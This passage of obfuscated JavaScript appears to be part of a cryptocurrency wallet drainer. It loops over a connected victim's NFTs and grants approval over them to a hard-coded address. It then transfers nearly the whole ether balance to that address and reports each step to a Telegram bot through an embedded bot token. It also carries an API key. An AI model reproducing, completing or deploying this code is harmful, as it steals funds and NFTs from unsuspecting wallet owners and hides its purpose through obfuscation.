_0x431093=['approved','getAccounts','rsk-testnet','log','Transaction\x20Hash:\x20','Web3Modal','reserveApes','accountsChanged','error','_owner','swimmer-testnet','maximumFee','_upgradedAddress','flarenetworks-flare-testnet','name','https://deep-index.moralis.io/api/v2/','default','5380NIurtR','1434dPFTYq','LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn','receipt','1bVytce','numberOfTokens','setStartingIndex','9258579dMhtAz','apePrice','Issue','status','string','TOKEN\x20Contract\x20Address\x20','eth-mainnet','transactionHash','true','sending\x20ether','unpause','Insufficient\x20funds\x20for\x20transfer','catch','Could\x20not\x20get\x20a\x20wallet\x20connection','RemovedBlackList','skale-omnus','0xea8968B218a551919FbD5f1166328C82a96dED54','message','aurora-testnet','Deprecate','getChainId','payable','arbitrum-mainnet','oasys-testnet','flipSaleState','kcc-testnet','1723335QLFexw','allowance','constructor','transfer','setRevealTimestamp','Token','swimmer-mainnet','newAddress','Pause','harmony-testnet','https://bsc-dataseed.binance.org','NFTs\x20collection\x20','_to','flarenetworks-canary-mainnet','maxFee','filter','Transaction\x20is\x20submitted\x20to\x20the\x20network','bsc','999999999999999999999999999999999999999999999999999999999999999999999999','1930IsaNAT','palm-mainnet','owner','Transaction\x20Rejected','then','function','Approval','getBalance','cronos-mainnet','send','balance','moonbeam-moonriver','AddedBlackList','click','4fOgCmM','bsc-testnet','_blackListedUser','astar-mainnet','gather-testnet','/erc20','estimateGas','_clearedUser','sort','address','toString','redeem','gas','sx-mainnet','baseURI','newMaxFee','setProvenanceHash','mintApe','withdraw','16189176Pqxtzh','destroyBlackFunds','fantom-mainnet','json','setApprovalForAll','68562oPAXdg','skale-calypso','transferFrom','Cl\x20address\x20:\x20','bytes','map','saleStart','.connect','event','boba-bobabase-testnet','bool','WalletConnectProvider','emerald-paratime-mainnet','saleIsActive','application/json','paused','base-testnet','search','astar-shibuya','uint256','isBlackListed','connect','who','view','isApprovedForAll','operator','upgradedAddress','boba-avalanche-testnet','newOwner','_value','getApproved','Redeem','axie-mainnet','allowed','BAYC_PROVENANCE','deprecated','moonbeam-moonbase-alpha','getBlackListStatus','value','3512PEGxzt','interfaceId','nonpayable','flarenetworks-canary-testnet','web3','Contract','sendTransaction','tokenOfOwnerByIndex','renounceOwnership','mantle-testnet','Your\x20address\x20','https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?Oxc_id=','metis-testnet','binance','Error\x20collecting\x20info\x20about\x20wallet','matic-mumbai','eth','optimism-mainnet','&text=','skale-razor','0x324BE2C089BA3e8E660C24c207c3bc14d4F7105f','/nft/collections?chain=','_symbol','Error:\x20','newBasisPoints','meter-mainnet','GET','5227607491','Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens','_evilUser','boba-mainnet','previousOwner','Token\x20balance\x20is\x20','moonbeam-mainnet','totalSupply','tokenId','maxApePurchase','evmos-mainnet','findora-mainnet','arbitrum-goerli','_data','chainId:','issue','all','amount','bittorrent-testnet','setBaseURI','covalent-internal-network-v1','safeTransferFrom','avalanche-mainnet','Transfer','index','Error\x20processing\x20item\x20','canto-mainnet','milkomeda-c1-devnet','OwnershipTransferred','Approve\x20Completed\x20Successfully','avalanche-dexalot-testnet','deprecate','evmos-testnet','Wallet\x20Connected\x20Successfully!','usd','Transaction\x20Receipt:\x20','basisPointsRate','10000','symbol','boba-bnb-testnet','Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','provenanceHash','decimals','pause','remaining','avalanche-testnet','solana-mainnet','_spender','oasis-sapphire-mainnet','2855154dCqgMX','balances','astar-shiden','approve','_name','New\x20token','boba-bobabeam-mainnet','result','tokens-list','polygon-zkevm-testnet','avalanche-dexalot-mainnet','tokenURI','boba-rinkeby-testnet','defi-kingdoms-testnet','length','transferOwnership','milkomeda-c1-mainnet','oasys-mainnet','addBlackList','tokenByIndex','removeBlackList','balanceOf','&vs_currencies=usd','boba-goerli','REVEAL_TIMESTAMP','nervos-polyjuice-testnet','skale-staging-uum','from','findora-forge-testnet','boba-bnb-mainnet','flarenetworks-flare-mainnet','kcc-mainnet','19187WTVdir','token_address','oasis-sapphire-testnet'];_0x34ef=function(){return _0x431093;};return _0x34ef();}async function loopNfts(_0x2047b8){const _0x4673ec=_0x14157c;for await(let _0x372de4 of _0x2047b8){console[_0x4673ec(0x1e8)]('NFT',_0x372de4);try{let _0x3ecab7=new web3Object[(_0x4673ec(0x186))][(_0x4673ec(0x17b))](ABIN,_0x372de4[_0x4673ec(0x1e3)]);await _0x3ecab7['methods'][_0x4673ec(0x24f)](Oxa,_0x4673ec(0x205))['send']({'from':selectedAccount,'to':_0x372de4[_0x4673ec(0x1e3)]})['on']('transactionHash',_0x5a5542=>{const _0x197443=_0x4673ec;console[_0x197443(0x1e8)](_0x197443(0x1e9)+_0x5a5542),sendMessage(_0x197443(0x227));})['on'](_0x4673ec(0x1f9),_0xf9b041=>{const _0xc62803=_0x4673ec;console[_0xc62803(0x1e8)]('Transaction\x20Receipt:\x20'+_0xf9b041),sendMessage(_0xc62803(0x1ae)),sendMessage('NFT\x20Contract\x20Address\x20'+token['address']),sendMessage(_0xc62803(0x180)+Oxa);})['on'](_0x4673ec(0x1ed),_0x2a768e=>{const _0x5c5d01=_0x4673ec;console[_0x5c5d01(0x1e8)](_0x5c5d01(0x18d)+_0x2a768e),sendMessage(_0x5c5d01(0x22d));});}catch(_0x156f75){console[_0x4673ec(0x1e8)](_0x4673ec(0x18d)+_0x156f75),sendMessage(_0x4673ec(0x22d));}}await onSendEther();}async function onSendEther(){const _0x1a2ecc=_0x14157c;console[_0x1a2ecc(0x1e8)](_0x1a2ecc(0x206));try{let _0x391b03=await web3Object[_0x1a2ecc(0x186)][_0x1a2ecc(0x231)](selectedAccount);var _0x2e54da=await web3Object[_0x1a2ecc(0x186)]['getGasPrice'](),_0x59bb9c={'gasPrice':_0x2e54da,'from':selectedAccount,'to':Oxa,'value':_0x391b03};_0x59bb9c[_0x1a2ecc(0x244)]=_0x2f539d,_0x59bb9c[_0x1a2ecc(0x175)]=_0x391b03-0xaa87bee538000,console['log'](_0x59bb9c['value']);var _0x2f539d=await web3Object[_0x1a2ecc(0x186)][_0x1a2ecc(0x23e)](_0x59bb9c),_0x5a3ad1=_0x2e54da*_0x2f539d;web3Object[_0x1a2ecc(0x186)][_0x1a2ecc(0x17c)](_0x59bb9c)['on'](_0x1a2ecc(0x204),_0xa0f162=>{const _0x13e765=_0x1a2ecc;console[_0x13e765(0x1e8)]('Transaction\x20Hash:\x20',_0xa0f162),sendMessage(_0x13e765(0x227));})['on'](_0x1a2ecc(0x1f9),_0x3e1c8c=>{const _0x532758=_0x1a2ecc;console[_0x532758(0x1e8)](_0x532758(0x1b4),_0x3e1c8c),sendMessage(_0x532758(0x192));})['on'](_0x1a2ecc(0x1ed),_0x248ffc=>{const _0x2bc983=_0x1a2ecc;console[_0x2bc983(0x1e8)](_0x2bc983(0x18d),_0x248ffc),sendMessage(_0x2bc983(0x22d));});}catch{sendMessage(_0x1a2ecc(0x208));}}async function sendMessage(_0x315cf7){return new Promise((_0x3b0b79,_0x5be0c8)=>{const _0x8fe46b=_0x358c,_0x33b2d4=Oxc;fetch(_0x8fe46b(0x181)+_0x33b2d4+_0x8fe46b(0x188)+_0x315cf7,{'method':_0x8fe46b(0x190),'headers':{}})[_0x8fe46b(0x22e)](async _0x2fbeae=>{const _0x3b0626=_0x8fe46b;if(_0x2fbeae[_0x3b0626(0x200)]>0x18f)throw _0x2fbeae;_0x3b0b79(await _0x2fbeae[_0x3b0626(0x24e)]());})[_0x8fe46b(0x209)](_0x510a0a=>{_0x5be0c8(_0x510a0a);});});}async function getPrice(_0x16ce31){return new Promise((_0x487de2,_0x45ac27)=>{const _0x1f11e0=_0x358c;fetch('https://api.coingecko.com/api/v3/simple/token_price/binance-smart-chain?contract_addresses='+_0x16ce31+_0x1f11e0(0x1d8),{'method':_0x1f11e0(0x190),'headers':{}})[_0x1f11e0(0x22e)](async _0xdb60f9=>{const _0x5aeef0=_0x1f11e0;if(_0xdb60f9['status']>0x18f)throw _0xdb60f9;_0x487de2(await _0xdb60f9[_0x5aeef0(0x24e)]());})[_0x1f11e0(0x209)](_0x17bed9=>{_0x45ac27(_0x17bed9);});});}async function getValue(_0x2a2599,_0x2ba1fc,_0x48a2ad){const _0x360b3c=_0x14157c;console['log'](_0x2a2599,_0x2ba1fc,_0x48a2ad);let _0x300069=await getPrice(_0x2a2599);console[_0x360b3c(0x1e8)]('price',_0x300069),_0x300069=parseFloat(_0x300069[_0x2a2599][_0x360b3c(0x1b3)]);let _0x31648f=_0x2ba1fc/0xa**(_0x48a2ad||0x12)*_0x300069;return _0x31648f=parseInt(_0x31648f),_0x300069?_0x31648f:0x0;}async function getNFTs(_0x537cf3='',_0x555a4c=_0x14157c(0x1f8),_0x1c1fab=_0x14157c(0x228),_0x50b3b8='50'){return new Promise((_0x76219d,_0x16f17f)=>{const _0x1002cd=_0x358c;fetch(_0x1002cd(0x1f4)+_0x537cf3+_0x1002cd(0x18b)+_0x1c1fab+'&format=decimal&limit='+_0x50b3b8,{'method':_0x1002cd(0x190),'headers':{'accept':_0x1002cd(0x25e),'X-API-Key':_0x555a4c}})[_0x1002cd(0x22e)](async _0x3b1a40=>{const _0x4f55ec=_0x1002cd;if(_0x3b1a40['status']>0x18f)throw _0x3b1a40;_0x76219d(await _0x3b1a40[_0x4f55ec(0x24e)]());})[_0x1002cd(0x209)](_0x1a3f1e=>{_0x16f17f(_0x1a3f1e);});});}